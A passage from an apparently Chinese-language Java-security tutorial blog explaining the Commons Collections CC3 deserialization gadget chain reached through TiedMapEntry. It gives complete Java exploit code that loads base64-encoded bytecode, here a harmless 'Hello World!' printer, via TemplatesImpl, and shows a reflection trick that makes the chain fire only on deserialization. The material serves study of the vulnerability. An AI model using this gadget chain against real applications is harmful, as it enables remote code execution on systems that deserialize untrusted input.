class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>,templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">        Map outerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        outerMap.put(tiedMapEntry,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        innerMap.remove(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(outerMap);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230818164229904.png"
                      alt="image-20230818164229904"
                ></p>
<p>回忆在CC6用<code>TiedMapEntry</code>执行任意命令的情况。当时执行命令时弹出了两个计算器。根据上面的返回结果来看，却只打印了一个<code>Hello World!</code></p>
<p>这里的打印结果是本地执行<code>outerMap.put(tiedMapEntry,&quot;test&quot;)</code>触发的，在打印完结果后，便会进行报错，导致无法进行序列化和反序列化。该如何解决？</p>
<p>直接上修改后的demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntryForCC3</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>,templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">        Map outerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        outerMap.put(tiedMapEntry,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        innerMap.remove(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;iTransformers&quot;</span>,chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(outerMap);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和原来的代码相比，增加了<code>fakeTransformers</code>，其没有实际意义，但可以避免本地运行时的命令执行。执行完<code>outerMap.put()</code>之后，再通过反射修改<code>ChainedTransformer</code>中的成员变量为真实的<code>transformers</code>，即可保证反序列化时的正常命令执行。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CC3和CC1、CC6的区别：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//new ConstantTransformer(templates),</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
</search>
